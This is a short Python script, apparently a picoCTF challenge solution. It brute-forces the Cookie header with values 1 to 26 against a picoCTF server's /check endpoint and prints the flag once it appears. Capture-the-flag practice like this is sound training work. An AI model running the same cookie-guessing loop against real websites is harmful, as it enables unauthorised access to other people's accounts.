import requests

for i in range(26):
    r = requests.get('http://mercury.picoctf.net:29649/check', headers={ "Cookie": f'{i + 1}' })
    if 'pico' in (a := r.content.decode('utf-8')):
        print(a)
        break
